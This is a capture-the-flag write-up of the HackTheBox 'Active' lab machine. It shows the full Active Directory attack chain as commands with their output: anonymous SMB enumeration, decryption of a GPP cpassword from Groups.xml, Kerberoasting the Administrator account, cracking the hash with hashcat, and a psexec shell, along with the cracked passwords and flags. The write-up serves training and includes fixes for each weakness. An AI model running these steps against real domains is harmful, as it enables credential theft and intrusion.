# Key Takeaways
- When noticing old architecture (Windows Server 2008, Windows 8, etc.) don't forget to check for old insecure artifacts from that time period such as Groups.xml. (user.txt)
- Once initial credentials are gained, remote access is not the only way forward. Leverage all possibilities with credentials.. such as Kerberoasting. (root.txt)

# Overview
- Platform: Windows
- HTB Rating: Easy - Medium

### Vulnerabilities
- The old Groups.xml file which contains encrypted (but easily crackable) usernames and passwords had never been cleaned/removed from the server SMB share.
- Anonymous access to one of the SMB shares allowed for enumeration and privilege escalation. Anonymous access should be removed entirely.
- An Administrator account was used as a service account, allowing for Kerberoasting and eventual password brute forcing of the password. Separate low privilege service accounts should be used for this purpose.
- A weak password was used on the Administrator account.

### Strengths
- The lack of readily available remote access services exposed to the network made exploitation more difficult.

# Solving user.txt
I started off this box with the generic nmap scans.
```
└──╼sudo nmap -sS -oA allports -p- 10.10.10.100
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
9389/tcp  open  adws
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49165/tcp open  unknown
49171/tcp open  unknown
49173/tcp open  unknown
```

Noticing that SMB was available, I looked to see if we could access the shares via a null session. Sure enough, we had READ access to one share.
```
└──╼ $nxc smb 10.10.10.100 -u '' -p '' --shares
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\:
SMB         10.10.10.100    445    DC               [*] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON                        Logon server share
SMB         10.10.10.100    445    DC               Replication     READ
SMB         10.10.10.100    445    DC               SYSVOL                          Logon server share
SMB         10.10.10.100    445    DC               Users
```

Noticing that DNS was also available, I also did a quick check for entries and if I could zone transfer. This did not yield any results.
```
└──╼ $dig any active.htb @10.10.10.100

; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> any active.htb @10.10.10.100
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: FORMERR, id: 56180
;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
; COOKIE: bb14944e88e7a9cd (echoed)
;; QUESTION SECTION:
;active.htb.                    IN      ANY
```

```
└──╼ $dig axfr active.htb @10.10.10.100

; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> axfr active.htb @10.10.10.100
;; global options: +cmd
; Transfer failed.
```

To quickly look through the one readable SMB share for useful information, I used netexec to spider through it.
```
└──╼ $nxc smb 10.10.10.100 -u '' -p '' -M spider_plus --share Replication
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\:
SPIDER_PLUS 10.10.10.100    445    DC               [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.10.10.100    445    DC               [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.10.10.100    445    DC               [*]     STATS_FLAG: True
SPIDER_PLUS 10.10.10.100    445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.10.10.100    445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.10.10.100    445    DC               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.10.10.100    445    DC               [*]  OUTPUT_FOLDER: /tmp/nxc_hosted/nxc_spider_plus
SMB         10.10.10.100    445    DC               [*] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON                        Logon server share
SMB         10.10.10.100    445    DC               Replication     READ
SMB         10.10.10.100    445    DC               SYSVOL                          Logon server share
SMB         10.10.10.100    445    DC               Users
SPIDER_PLUS 10.10.10.100    445    DC               [+] Saved share-file metadata to "/tmp/nxc_hosted/nxc_spider_plus/10.10.10.100.json".
SPIDER_PLUS 10.10.10.100    445    DC               [*] SMB Shares:           7 (ADMIN$, C$, IPC$, NETLOGON, Replication, SYSVOL, Users)
SPIDER_PLUS 10.10.10.100    445    DC               [*] SMB Readable Shares:  1 (Replication)
SPIDER_PLUS 10.10.10.100    445    DC               [*] Total folders found:  22
SPIDER_PLUS 10.10.10.100    445    DC               [*] Total files found:    7
SPIDER_PLUS 10.10.10.100    445    DC               [*] File size average:    1.16 KB
SPIDER_PLUS 10.10.10.100    445    DC               [*] File size min:        22 B
SPIDER_PLUS 10.10.10.100    445    DC               [*] File size max:        3.63 KB
```

I then looked through the 10.10.10.100.json file for interesting files. The main file that caught my attention here was Groups.xml as I vaguely remembered that Microsoft had leaked a decryption key for credentials stored in this file long ago and generally no longer used this type of credentials storage.
```json
└──╼ $cat 10.10.10.100.json
{
    "Replication": {
        "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {
            "atime_epoch": "2018-07-21 06:37:44",
            "ctime_epoch": "2018-07-21 06:37:44",
            "mtime_epoch": "2018-07-21 06:38:11",
            "size": "23 B"
        },
        "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI": {
            "atime_epoch": "2018-07-21 06:37:44",
            "ctime_epoch": "2018-07-21 06:37:44",
            "mtime_epoch": "2018-07-21 06:38:11",
            "size": "119 B"
        },
        "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2018-07-21 06:37:44",
            "ctime_epoch": "2018-07-21 06:37:44",
            "mtime_epoch": "2018-07-21 06:38:11",
            "size": "1.07 KB"
        },
        "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml": {
            "atime_epoch": "2018-07-21 06:37:44",
            "ctime_epoch": "2018-07-21 06:37:44",
            "mtime_epoch": "2018-07-21 06:38:11",
            "size": "533 B"
        },
        "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol": {
            "atime_epoch": "2018-07-21 06:37:44",
            "ctime_epoch": "2018-07-21 06:37:44",
            "mtime_epoch": "2018-07-21 06:38:11",
            "size": "2.72 KB"
        },
        "active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI": {
            "atime_epoch": "2018-07-21 06:37:44",
            "ctime_epoch": "2018-07-21 06:37:44",
            "mtime_epoch": "2018-07-21 06:38:11",
            "size": "22 B"
        },
        "active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2018-07-21 06:37:44",
            "ctime_epoch": "2018-07-21 06:37:44",
            "mtime_epoch": "2018-07-21 06:38:11",
            "size": "3.63 KB"
        }
    }
}
```

I used SMBClient to connect and download the Groups.xml file. I then read the contents.
```
└──╼ $smbclient -N \\\\10.10.10.100\\Replication
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \active.htb\> cd Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> dir
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Groups.xml                          A      533  Wed Jul 18 16:46:06 2018

                5217023 blocks of size 4096. 273579 blocks available
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> get Groups.xml
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Groups.xml (3.3 KiloBytes/sec) (average 3.3 KiloBytes/sec)
```

```
└──╼ $cat Groups.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

In the file, I noted there is a user: `active.htb\SVC_TGS` and a cpassword property: `edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`

A quick refresher on this from Google told me that this is a Group Policy Preference password, and can easily be decrypted using known tools. I used [gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt).
```
└──╼ $gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

This then gave me a set of valid credentials: `active.htb\SVC_TGS` and `GPPstillStandingStrong2k18`.

I then enumerated the available SMB shares again with the new user credentials and found that we had more access. This time, we had READ access to 4 different shares.
```
└──╼ $netexec smb 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18 --shares
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
SMB         10.10.10.100    445    DC               [*] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON        READ            Logon server share
SMB         10.10.10.100    445    DC               Replication     READ
SMB         10.10.10.100    445    DC               SYSVOL          READ            Logon server share
SMB         10.10.10.100    445    DC               Users           READ
```

I connected to the Users share via SMBClient and looked around, quickly finding the `user.txt` flag under `\SVC_TGS\Desktop\`.
```
└──╼ $smbclient -U active.htb\\SVC_TGS \\\\10.10.10.100\\Users
Password for [ACTIVE.HTB\SVC_TGS]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Sat Jul 21 10:39:20 2018
  ..                                 DR        0  Sat Jul 21 10:39:20 2018
  Administrator                       D        0  Mon Jul 16 06:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
  Default                           DHR        0  Tue Jul 14 02:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
  Public                             DR        0  Tue Jul 14 00:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018

                5217023 blocks of size 4096. 273579 blocks available
smb: \> cd SVC_TGS\Desktop
smb: \SVC_TGS\Desktop\> get user.txt
getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
```

```
└──╼ $cat user.txt
1637b113bc72da37ee0efcb7676c55eb
```

# Solving root.txt
At this point, I did spend some time poking around through the other SMB shares for awhile, looking for possible credentials and the like. I also spent some time staring at my list of services found with nmap, noting the stark lack of remote access tools.

After taking a short break to think about things further, I realized that remote access isn't the only thing we can do with valid user credentials at this point... we can try Kerberoasting to see if any user accounts have a SPN setup. Sure enough, we find that the Administrator account itself is setup with a Service Principal Name.
```
└──╼ $GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2026-01-07 23:23:38.53376
```

Having this SPN setup on the Administrator account allows any user account to request the TGS for the associated account, and depending on the strength of this account's password, it may be able to be brute forced. I further used `GetUserSPNs.py` to request the TGS for the Administrator account.

```
└──╼ $GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request-user Administrator
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2026-01-07 23:23:38.533769         


[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$1a140f1edba907ad32eaef678c1d4f35$37b60befc6458da8502f8f20c2dc59d983a1c0bdf0fa7f237c8076250df502bcda425aca4573ce5fd6e2331eb02f96b8cf41dfa3891e434e55a3e5e75ef752d1905579ec5ccd0e5090741d99433dec3513a2871f90c8359070b16c05d6319af0c25abf5a7d28ea0985d9a8ab451a3b565ecba7a0d522ae881dd7cfedc5d5c13f1ab85c64bf37a9d99d234ecffa49de4f6a775007d6d7b2a4247a0d2331c949b04146e37c4d885e077effe0ba14b3916a55abe117d4a38ca5c07436978f17df3d784093b8212a941cd728a489f682bec95f5e14792aea9a19358fdf7222852fa734e61065ad9c7ba18cefa7cf2cf70e0d73bd2e61bdd0c19a29da722a036d0391f3755d3179c6a964269ebd7660c526b741d701d42f1332cc664d273895524b6542d6fd857365ad90b3f578da59786e294e7088938aeaa44d13ff4dc8146ba3910874c77011ab80b01d5dd76590dfb36368d119d5b67a94f603e834b6140e7a67ec943f6f1a6561fd9b804bfaaf5513c1344a0952e2e59ecbd6310046aba3d59ad22be9fe04729d046fa0123557016337835699a95290888609490c1e8bb351428c2fee66eddde1f87b205348f6189247581eb3b1ff36d08e8cf82d467cfa6eaa9fb9231e197c78ef29c01200d47ca147616e107e2b9722f6f6ed854ecdd1b2276085c742e70ec787311562720bf979188a84baed0e3ef133651c0539129085f9ed831f7ef3dddb456cb7f79eeb8151e0b0875adae347e8d9e20e14acde9e073b1f8c92524cb279a1af90669d73cd20f7bfa456cd4759fca704a763a8b6738f12da97ed3ee53c1c65fbaba06418e623371498b97cdee12dca7f5dc52589e5f19c1c7fc85ae4ed17db8f0ff6289f8190db681e724e76ec0b39ed547b78a406d6675a81d4032cf2516025daa46d428de529fa651ebfb1abf9cb8e3904cda27ebf0521ec75da9c4a0973eaa44c9f6400f5c12418da2ab0beca7211ba8c2b74729d68c84d2e3b5bc9835d3a9b191dec1357b0e8e71957de2d5c70bc962ea2a6710928cb8d9bd3b3f2baa69a7fbd292ebcc55d05e7a46f26d862c3e0f36e26d604a803388223ace0b64a0bda73be86e7211098af443740529e71a4ef97aae463c51359411ab867bdf4870db4322d5801067fa24b660cc12e74c981ebec14c9b9850f86421042fd288a46c92ef0a608867e2f4c47aa8385c2c55bb2b0cbf755a77dea14404879ac4d2d280bb4b6cb087bd13117cc11a6ec09e17f50368b
```

I then ran this through hashcat with module 13100 to attempt to retrieve the cleartext password.
```
└──╼ $hashcat -m 13100 admin_kerberost.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

<SNIP>

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$1a140f1edba907ad32eaef678c1d4f35$37b60befc6458da8502f8f20c2dc59d983a1c0bdf0fa7f237c8076250df502bcda425aca4573ce5fd6e2331eb02f96b8cf41dfa3891e434e55a3e5e75ef752d1905579ec5ccd0e5090741d99433dec3513a2871f90c8359070b16c05d6319af0c25abf5a7d28ea0985d9a8ab451a3b565ecba7a0d522ae881dd7cfedc5d5c13f1ab85c64bf37a9d99d234ecffa49de4f6a775007d6d7b2a4247a0d2331c949b04146e37c4d885e077effe0ba14b3916a55abe117d4a38ca5c07436978f17df3d784093b8212a941cd728a489f682bec95f5e14792aea9a19358fdf7222852fa734e61065ad9c7ba18cefa7cf2cf70e0d73bd2e61bdd0c19a29da722a036d0391f3755d3179c6a964269ebd7660c526b741d701d42f1332cc664d273895524b6542d6fd857365ad90b3f578da59786e294e7088938aeaa44d13ff4dc8146ba3910874c77011ab80b01d5dd76590dfb36368d119d5b67a94f603e834b6140e7a67ec943f6f1a6561fd9b804bfaaf5513c1344a0952e2e59ecbd6310046aba3d59ad22be9fe04729d046fa0123557016337835699a95290888609490c1e8bb351428c2fee66eddde1f87b205348f6189247581eb3b1ff36d08e8cf82d467cfa6eaa9fb9231e197c78ef29c01200d47ca147616e107e2b9722f6f6ed854ecdd1b2276085c742e70ec787311562720bf979188a84baed0e3ef133651c0539129085f9ed831f7ef3dddb456cb7f79eeb8151e0b0875adae347e8d9e20e14acde9e073b1f8c92524cb279a1af90669d73cd20f7bfa456cd4759fca704a763a8b6738f12da97ed3ee53c1c65fbaba06418e623371498b97cdee12dca7f5dc52589e5f19c1c7fc85ae4ed17db8f0ff6289f8190db681e724e76ec0b39ed547b78a406d6675a81d4032cf2516025daa46d428de529fa651ebfb1abf9cb8e3904cda27ebf0521ec75da9c4a0973eaa44c9f6400f5c12418da2ab0beca7211ba8c2b74729d68c84d2e3b5bc9835d3a9b191dec1357b0e8e71957de2d5c70bc962ea2a6710928cb8d9bd3b3f2baa69a7fbd292ebcc55d05e7a46f26d862c3e0f36e26d604a803388223ace0b64a0bda73be86e7211098af443740529e71a4ef97aae463c51359411ab867bdf4870db4322d5801067fa24b660cc12e74c981ebec14c9b9850f86421042fd288a46c92ef0a608867e2f4c47aa8385c2c55bb2b0cbf755a77dea14404879ac4d2d280bb4b6cb087bd13117cc11a6ec09e17f50368b:Ticketmaster1968

<SNIP>
```

The password is cracked and we have another set of valid credentials: `Administrator` and `Ticketmaster1968`.

I then simply used `psexec.py` to connect to the server remotely and retrieve the root.txt flag.
```
└──╼ $psexec.py Administrator:Ticketmaster1968@10.10.10.100
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file EeOMejZM.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service bOiv on 10.10.10.100.....
[*] Starting service bOiv.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop> type root.txt
de2f48ff0509a8945fdfd5fca88e1c31
```
